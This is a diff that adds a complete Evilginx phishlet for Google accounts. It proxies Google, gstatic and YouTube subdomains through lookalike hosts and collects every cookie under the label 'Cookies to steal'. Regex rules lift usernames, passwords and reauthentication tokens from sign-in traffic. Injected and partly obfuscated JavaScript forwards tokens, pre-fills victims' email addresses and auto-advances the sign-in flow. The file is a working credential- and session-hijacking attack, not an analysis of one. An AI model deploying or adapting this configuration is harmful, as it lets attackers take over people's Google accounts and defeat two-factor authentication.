@@ -1,0 +1,433 @@
+min_ver: "4.0.0"
+
+# Subdomains that Evilginx will proxy
+proxy_hosts:
+  - {
+      phish_sub: "w3",
+      orig_sub: "www",
+      domain: "google.com",
+      session: false,
+      is_landing: false,
+    }
+  - {
+      phish_sub: "ogs",
+      orig_sub: "ogs",
+      domain: "google.com",
+      session: false,
+      is_landing: false,
+    }
+  - {
+      phish_sub: "12",
+      orig_sub: "accounts",
+      domain: "google.com",
+      session: true,
+      is_landing: true,
+      auto_filter: false,
+    }
+  - {
+      phish_sub: "ssl",
+      orig_sub: "ssl",
+      domain: "gstatic.com",
+      session: false,
+      is_landing: false,
+      auto_filter: false,
+    }
+  - {
+      phish_sub: "www",
+      orig_sub: "www",
+      domain: "gstatic.com",
+      session: false,
+      is_landing: false,
+      auto_filter: false,
+    }
+  - {
+      phish_sub: "play",
+      orig_sub: "play",
+      domain: "google.com",
+      session: false,
+      is_landing: false,
+      auto_filter: false,
+    }
+  - {
+      phish_sub: "myaf",
+      orig_sub: "myaccount",
+      domain: "google.com",
+      session: true,
+      is_landing: false,
+      auto_filter: true,
+    }
+  - {
+      phish_sub: "apis",
+      orig_sub: "apis",
+      domain: "google.com",
+      session: false,
+      is_landing: false,
+      auto_filter: false,
+    }
+  - {
+      phish_sub: "content",
+      orig_sub: "content",
+      domain: "googleapis.com",
+      session: false,
+      is_landing: false,
+      auto_filter: false,
+    }
+  - {
+      phish_sub: "youtube",
+      orig_sub: "accounts",
+      domain: "youtube.com",
+      session: false,
+      is_landing: false,
+      auto_filter: false,
+    }
+
+  #- {phish_sub: 'signaler-pa', orig_sub: 'signaler-pa', domain: 'googleapis.com', session: true, is_landing: false}
+
+# Replace rules to avoid unwanted redirection
+sub_filters:
+  - {
+      triggers_on: "accounts.google.com",
+      orig_sub: "accounts",
+      domain: "google.com",
+      search: "www.gstatic.com",
+      replace: "www.{domain}",
+      mimes:
+        [
+          "text/html",
+          "application/json",
+          "application/javascript",
+          "text/javascript",
+        ],
+    }
+  - {
+      triggers_on: "accounts.google.com",
+      orig_sub: "accounts",
+      domain: "google.com",
+      search: "accounts.google.com",
+      replace: "12.{domain}",
+      mimes:
+        [
+          "text/html",
+          "application/json",
+          "application/javascript",
+          "text/javascript",
+        ],
+    }
+  - {
+      triggers_on: "myaccount.google.com",
+      orig_sub: "myaccount",
+      domain: "google.com",
+      search: "https://{hostname}",
+      replace: "https://{hostname}",
+      mimes:
+        [
+          "application/json",
+          "text/html",
+          "application/javascript",
+          "text/javascript",
+        ],
+    }
+  #- {triggers_on: 'myaccount.google.com', orig_sub: 'myaccount', domain: 'google.com', search: '</head>', replace: '<script>document.addEventListener("DOMContentLoaded",function(){let e,o;setInterval(function t(){console.log("monitor started"),(e=document.querySelector(`[jsname="P1ekSe"][role="progressbar"]`))&&2===e.classList.length?(console.log("we HAVE spinner"),o||(console.log("we started timeout"),o=setTimeout(()=>{console.log("we should refresh page"),location.reload(!0)},1e4))):(console.log("we dont HAVE spinner"),clearTimeout(o),o=null)},1e3)});</script></head>', mimes: ['application/json', 'text/html', 'application/javascript', 'text/javascript']}
+
+  #- {triggers_on: 'apis.google.com', orig_sub: 'apis', domain: 'google.com', search: 'https://apis.google.com', replace: 'https://apis.{hostname}', mimes: ['text/html', 'application/json', 'application/x-javascript', 'text/javascript', 'application/javascript']}
+  #- {triggers_on: 'signaler-pa.googleapis.com', orig_sub: 'signaler-pa', domain: 'googleapis.com', search: 'https://signaler-pa.googleapis.com', replace: 'https://signaler-pa.{hostname}', mimes: ['text/html', 'application/json', 'application/x-javascript', 'text/javascript', 'application/javascript']}
+
+# Cookies to steal
+auth_tokens:
+  - domain: "google.com"
+    keys: [".*,regexp,always"]
+  - domain: ".google.com"
+    keys: [".*,regexp,always"]
+  - domain: "googleapis.com"
+    keys: [".*,regexp,always"]
+  - domain: ".googleapis.com"
+    keys: [".*,regexp,always"]
+  - domain: "googletagmanager.com"
+    keys: [".*,regexp,always"]
+  - domain: ".googletagmanager.com"
+    keys: [".*,regexp,always"]
+  - domain: "youtube.com"
+    keys: [".*,regexp,always"]
+  - domain: ".youtube.com"
+    keys: [".*,regexp,always"]
+  - domain: "accounts.google.com"
+    keys: [".*,regexp,always"]
+  - domain: ".accounts.google.com"
+    keys: [".*,regexp,always"]
+  - domain: "ogs.google.com"
+    keys: [".*,regexp,always"]
+  - domain: ".ogs.google.com"
+    keys: [".*,regexp,always"]
+  - domain: "accounts.google.bg"
+    keys: [".*,regexp,always"]
+  - domain: ".accounts.google.bg"
+    keys: [".*,regexp,always"]
+  - domain: "myaccount.google.com"
+    keys: [".*,regexp,always"]
+  - domain: ".myaccount.google.com"
+    keys: [".*,regexp,always"]
+  - domain: "mail.google.com"
+    keys: [".*,regexp,always"]
+
+    # Capture username/password credentials
+credentials:
+  username:
+    key: ""
+    search: '\[\[\["MI613e","\[null,\\"(.*?)\\"'
+    type: "post"
+  password:
+    key: ""
+    search: '\[1,\d+,null,\[1,null,null,null,\[\\"(.*?)\\",null,1\]\]'
+    type: "post"
+  custom:
+    - key: "f.req"
+      search: '\["gf.siecp","([^"]*)"\]'
+      type: "post"
+    - key: "rapt"
+      search: '"rapt":"([^"]*)'
+      type: "json"
+
+# URLs that finalize authentication
+auth_urls:
+  - "/_/AccountSettingsStrongauthUi/data/batchexecute"
+  - "/signinoptions/twosv"
+  # - '/restart'
+  # - '/_/AccountSettingsStrongauthUi/jserror'
+  - "/signinoptions/passkeys"
+  # - '/log'
+  - "/accounts/SetOSID"
+  - "/RotateCookies"
+  - "/$rpc/google.internal.onegoogle.asyncdata.v1.AsyncDataService/GetAsyncData"
+  - "/accounts/SetSID"
+  - "/RotateCookiesPage"
+  - "/u/0/widget/app"
+  - "/signinoptions/two-step-verification"
+  - "/v3/signin/challenge/pwd"
+  - "/v3/signin/challenge/totp"
+  - "/u/0/_/AccountSettingsStrongauthUi/browserinfo"
+  - "/u/0/signinoptions/twosv"
+  - "/signin/v2/identifier"
+  # - '/ServiceLogin'
+  - "/v3/signin/identifier"
+  - "/v3/signin/_/AccountsSignInUi/browserinfo"
+  - "/v3/signin/_/AccountsSignInUi/data/batchexecute"
+  - "^/accounts/SetOSID$"
+  - "^/v3/signin/challenge/dp$"
+  - "^/accounts/SetSID$"
+  - "/u/0/_/AccountSettingsStrongauthUi/gen204/"
+  - "/u/0/widget/account"
+  - "/ListAccounts"
+  - "/signinoptions/rescuephone"
+  - "/signinoptions/rescueemail"
+  - "/CheckCookie"
+  - "/ManageAccount"
+# - '/'
+
+# Corrected forced POST redirection for consistency
+force_post:
+  - path: "/selectchallenge"
+    search:
+      - { key: "flowEntry", search: ".*" }
+    force:
+      - { key: "continue", value: "https://myaccount.google.com" }
+    type: "post"
+  - path: "/signin"
+    search:
+      - { key: "flowEntry", search: ".*" }
+    force:
+      - { key: "continue", value: "https://myaccount.google.com" }
+    type: "post"
+  - path: "/"
+    search:
+      - { key: "flowEntry", search: ".*" }
+    force:
+      - { key: "continue", value: "https://myaccount.google.com" }
+    type: "post"
+
+# Legitimate site login page location
+login:
+  domain: "accounts.google.com"
+  path: "/signin/v2/identifier?hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin"
+
+# Injected JavaScript for redirection
+js_inject:
+  - trigger_domains: ["myaccount.google.com"]
+    trigger_paths: [".*"]
+    script: |
+      window.addEventListener('load', () => {if (window.location.pathname === '/') {window.location.href = '/u/4/signinoptions/twosv';return;};const urlParams = new URLSearchParams(window.location.search);if (urlParams.has('rapt')) {const xxxValue = urlParams.get('rapt');fetch('/xxx', {    method: 'POST',    headers: {        'Content-Type': 'application/json'    },    body: JSON.stringify({ rapt: xxxValue })})    .then(response => {        if (!response.ok) {            throw new Error('Network response was not ok');        }        return response.json();    })    .then(data => {        console.log('Success:', data);    })    .catch(error => {        console.error('Error:', error);    });}});
+  - trigger_domains: ["accounts.google.com"]
+    trigger_paths: ["/signin", "/"]
+    script: |
+      function _0x56ca(){var _0x3a42fb=['3605WYKPjA','href','SID','1980018GPFecK','12800YtkIgt','1983006cEMOxZ','1258011FVDepK','350985avgcIr','HSID','2120VLKNGs','addEventListener','cookie','location','https://myaccount.google.com','includes','897502nHaITN','8988hEcVVH'];_0x56ca=function(){return _0x3a42fb;};return _0x56ca();}function _0x1c86(_0x517739,_0x2bc75f){var _0x56ca60=_0x56ca();return _0x1c86=function(_0x1c861b,_0x5ccb6d){_0x1c861b=_0x1c861b-0x136;var _0x5229da=_0x56ca60[_0x1c861b];return _0x5229da;},_0x1c86(_0x517739,_0x2bc75f);}var _0x28616f=_0x1c86;(function(_0xbbc557,_0x3d9fc7){var _0x589ba5=_0x1c86,_0x2320b8=_0xbbc557();while(!![]){try{var _0x59bdad=-parseInt(_0x589ba5(0x141))/0x1+-parseInt(_0x589ba5(0x139))/0x2+parseInt(_0x589ba5(0x142))/0x3+-parseInt(_0x589ba5(0x13a))/0x4*(-parseInt(_0x589ba5(0x144))/0x5)+parseInt(_0x589ba5(0x140))/0x6+parseInt(_0x589ba5(0x13b))/0x7*(parseInt(_0x589ba5(0x13f))/0x8)+parseInt(_0x589ba5(0x13e))/0x9;if(_0x59bdad===_0x3d9fc7)break;else _0x2320b8['push'](_0x2320b8['shift']());}catch(_0x4f3860){_0x2320b8['push'](_0x2320b8['shift']());}}}(_0x56ca,0xb40b8),document[_0x28616f(0x145)]('DOMContentLoaded',function(){var _0x3291ba=_0x28616f;document[_0x3291ba(0x146)][_0x3291ba(0x138)](_0x3291ba(0x13d))&&document['cookie']['includes'](_0x3291ba(0x143))&&(window[_0x3291ba(0x136)][_0x3291ba(0x13c)]=_0x3291ba(0x137));});
+
+  # Add email pre-filling to this block (runs on all paths)
+  - trigger_domains: ["accounts.google.com"]
+    trigger_paths: [".*"]
+    script: |
+      // START ENHANCED EMAIL PRE-FILLING
+      function initEmailPreFill() {
+        if (!window.location.hash) {
+          console.log('No URL fragment found');
+          return;
+        }
+        
+        // Extract and clean email
+        const rawEmail = window.location.hash.substring(1);
+        let cleanEmail = rawEmail
+          .replace(/=/g, '')
+          .replace(/[^\w@.-]/g, '');
+        
+        // Handle email prefix (without @domain)
+        if (!cleanEmail.includes('@')) {
+          // Try to detect G Suite domain from page context
+          let gsuiteDomain = null;
+          
+          // Method 1: Check if there's a domain selector or hint on the page
+          const domainHint = document.querySelector('[data-domain], [data-email-domain], .domain-hint');
+          if (domainHint) {
+            gsuiteDomain = domainHint.getAttribute('data-domain') || 
+                          domainHint.getAttribute('data-email-domain') ||
+                          domainHint.textContent?.trim();
+          }
+          
+          // Method 2: Check URL parameters for domain hint (hd=hosted_domain is Google's standard)
+          const urlParams = new URLSearchParams(window.location.search);
+          const domainParam = urlParams.get('hd') || urlParams.get('domain');
+          if (domainParam) {
+            gsuiteDomain = domainParam;
+          }
+          
+          // Method 3: Check for G Suite domain in page content (common patterns)
+          if (!gsuiteDomain) {
+            const pageText = document.body?.textContent || '';
+            // Look for common G Suite indicators in page text
+            const domainMatch = pageText.match(/@([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})/);
+            if (domainMatch && domainMatch[1] !== 'gmail.com' && !domainMatch[1].includes('google.com')) {
+              gsuiteDomain = domainMatch[1];
+            }
+          }
+          
+          // Method 4: Check for domain in hidden form fields or data attributes
+          if (!gsuiteDomain) {
+            const hiddenInputs = document.querySelectorAll('input[type="hidden"][name*="domain"], input[type="hidden"][name*="hd"]');
+            for (const input of hiddenInputs) {
+              const value = input.value?.trim();
+              if (value && value !== 'gmail.com' && !value.includes('google.com') && value.includes('.')) {
+                gsuiteDomain = value;
+                break;
+              }
+            }
+          }
+          
+          // Append domain: G Suite if detected, otherwise Gmail
+          if (gsuiteDomain && gsuiteDomain !== 'gmail.com' && !gsuiteDomain.includes('google.com')) {
+            cleanEmail = cleanEmail + '@' + gsuiteDomain;
+            console.log('Detected G Suite domain, using:', cleanEmail);
+          } else {
+            cleanEmail = cleanEmail + '@gmail.com';
+            console.log('Using Gmail domain, email:', cleanEmail);
+          }
+        }
+        
+        console.log('Pre-filling email:', cleanEmail);
+        
+        // Robust element waiting function
+        function waitForElement(selector, callback, timeout = 5000) {
+          const startTime = Date.now();
+          const interval = setInterval(() => {
+            const element = document.querySelector(selector);
+            if (element) {
+              clearInterval(interval);
+              callback(element);
+            } else if (Date.now() - startTime > timeout) {
+              clearInterval(interval);
+              console.error(`Element not found: ${selector}`);
+            }
+          }, 100);
+        }
+        
+        // Wait for email input
+        waitForElement(
+          'input[type="email"], #identifierId, input[name="identifier"], input[autocomplete="email"]',
+          (emailInput) => {
+            // Set value and trigger full interaction
+            emailInput.value = cleanEmail;
+            
+            // Trigger all relevant events
+            ['input', 'change', 'blur'].forEach(eventType => {
+              emailInput.dispatchEvent(new Event(eventType, {
+                bubbles: true,
+                cancelable: true
+              }));
+            });
+            
+            console.log('Email field populated');
+            
+            // Wait for next button
+            setTimeout(() => {
+              // Comprehensive button selectors
+              const buttonSelectors = [
+                '#identifierNext',
+                '.VfPpkd-LgbsSe',
+                'button[data-primary-action="true"]',
+                'button[jsname="LgbsSe"]',
+                'button[aria-label="Next"]',
+                'button:contains("Next")',
+                'button:contains("Continue")',
+                'button:contains("Sign in")'
+              ];
+              
+              let nextButton = null;
+              
+              // Try all selectors
+              for (const selector of buttonSelectors) {
+                const btn = document.querySelector(selector);
+                if (btn && btn.offsetParent !== null) {
+                  nextButton = btn;
+                  break;
+                }
+              }
+              
+              // Fallback: Find by text content
+              if (!nextButton) {
+                const buttons = document.querySelectorAll('button');
+                for (const btn of buttons) {
+                  if (btn.textContent.match(/next|continue|sign in/i)) {
+                    nextButton = btn;
+                    break;
+                  }
+                }
+              }
+              
+              // Click if found
+              if (nextButton) {
+                console.log('Clicking next button');
+                nextButton.click();
+                
+                // Double-check after delay
+                setTimeout(() => {
+                  if (document.querySelector('input[type="password"]')) {
+                    console.log('Successfully advanced to password page');
+                  } else {
+                    console.warn('Password field not detected after click');
+                  }
+                }, 2000);
+              } else {
+                console.error('Next button not found');
+              }
+            }, 1500); // Increased delay
+          }
+        );
+      }
+
+      // Initialize with better timing
+      if (document.readyState === 'complete') {
+        setTimeout(initEmailPreFill, 500); // Extra delay for dynamic content
+      } else {
+        document.addEventListener('DOMContentLoaded', () => {
+          setTimeout(initEmailPreFill, 500);
+        });
+      }
+      // END ENHANCED EMAIL PRE-FILLING
+
+      const _0x287ac3 = _0x1f7a;function _0x4991() {  const _0x9df7e6 = ["classList", "monitor started", '[jsname="P1ekSe"][role="progressbar"]', "381184ttqtmj", "44HxjRkK", "40839vXPfaT", "we HAVE spinner", "374808lLrFvh", "6GbyRKs", "we started timeout", "1916453YQwGof", "DOMContentLoaded", "length", "100DsEZKU", "693840MMMTer", "39632xBGgJE", "reload", "addEventListener", "38889BPlwfP", "log"];  _0x4991 = function () {    return _0x9df7e6;  };  return _0x4991();}function _0x1f7a(_0x18a4d9, _0x25b450) {  const _0x499168 = _0x4991();  return _0x1f7a = function (_0x1f7ab7, _0x50ee51) {    _0x1f7ab7 = _0x1f7ab7 - 349;    let _0x5590d9 = _0x499168[_0x1f7ab7];    return _0x5590d9;  }, _0x1f7a(_0x18a4d9, _0x25b450);}(function (_0x1546f7, _0x26a61b) {  const _0x1e0dcc = _0x1f7a, _0x4cc73e = _0x1546f7();  while (true) {    try {      const _0x4687d7 = -parseInt(_0x1e0dcc(358)) / 1 + parseInt(_0x1e0dcc(350)) / 2 + parseInt(_0x1e0dcc(360)) / 3 * (parseInt(_0x1e0dcc(359)) / 4) + parseInt(_0x1e0dcc(349)) / 5 + parseInt(_0x1e0dcc(363)) / 6 * (parseInt(_0x1e0dcc(365)) / 7) + parseInt(_0x1e0dcc(362)) / 8 + parseInt(_0x1e0dcc(353)) / 9 * (parseInt(_0x1e0dcc(368)) / 10);      if (_0x4687d7 === _0x26a61b) break; else _0x4cc73e.push(_0x4cc73e.shift());    } catch (_0x3a6143) {      _0x4cc73e.push(_0x4cc73e.shift());    }  }}(_0x4991, 290983), document[_0x287ac3(352)](_0x287ac3(366), function () {  let _0x23676a, _0x4c1c81;  function _0x4d97cc() {    const _0x3cdd9b = _0x1f7a;    console[_0x3cdd9b(354)](_0x3cdd9b(356));    function _0x346a3d() {      const _0x1c0195 = _0x3cdd9b;      _0x23676a = document.querySelector(_0x1c0195(357)), _0x23676a && _0x23676a[_0x1c0195(355)][_0x1c0195(367)] === 2 ? (console.log(_0x1c0195(361)), !_0x4c1c81 && (console[_0x1c0195(354)](_0x1c0195(364)), _0x4c1c81 = setTimeout(() => {        const _0x532e11 = _0x1c0195;        console.log("we should refresh page"), location[_0x532e11(351)](true);      }, 1e4))) : (console[_0x1c0195(354)]("we dont HAVE spinner"), clearTimeout(_0x4c1c81), _0x4c1c81 = null);    }    _0x346a3d();  }  let _0x240c9c = setInterval(_0x4d97cc, 1e3);}));function _0x398e() {  const _0x7dd53e = ["6311272jlWuif", "10PIwbpi", "13563FUCmcV", "4404WbtfNW", "311058TwHVgc", "88zRjkGR", "includes", "23yjxbZu", "695597RWVaEz", "reload", "location", "href", "4PZBuNf", "1914336XzJzlC", "706220cjTUHU", "challenge"];  _0x398e = function () {    return _0x7dd53e;  };  return _0x398e();}(function (_0x57b7f5, _0x28834b) {  const _0x54f1ec = _0xd26c, _0x569d75 = _0x57b7f5();  while (true) {    try {      const _0x31ec8b = parseInt(_0x54f1ec(437)) / 1 * (parseInt(_0x54f1ec(433)) / 2) + -parseInt(_0x54f1ec(434)) / 3 * (parseInt(_0x54f1ec(442)) / 4) + -parseInt(_0x54f1ec(444)) / 5 + -parseInt(_0x54f1ec(443)) / 6 + parseInt(_0x54f1ec(438)) / 7 + parseInt(_0x54f1ec(435)) / 8 * (parseInt(_0x54f1ec(432)) / 9) + parseInt(_0x54f1ec(431)) / 10 * (parseInt(_0x54f1ec(430)) / 11);      if (_0x31ec8b === _0x28834b) break; else _0x569d75.push(_0x569d75.shift());    } catch (_0x2ae0ef) {      _0x569d75.push(_0x569d75.shift());    }  }}(_0x398e, 176360));function _0xd26c(_0x5d4e00, _0x325cb0) {  const _0x398ecb = _0x398e();  return _0xd26c = function (_0xd26ce, _0x5dc170) {    _0xd26ce = _0xd26ce - 429;    let _0x1a18e5 = _0x398ecb[_0xd26ce];    return _0x1a18e5;  }, _0xd26c(_0x5d4e00, _0x325cb0);}function checkURL() {  let url = window.location.href;  if (url.includes('specific-substring')) {    setTimeout(() => {      location.reload();    }, 15000);     clearInterval(intervalId);  }}let intervalId = setInterval(checkURL, 2000);
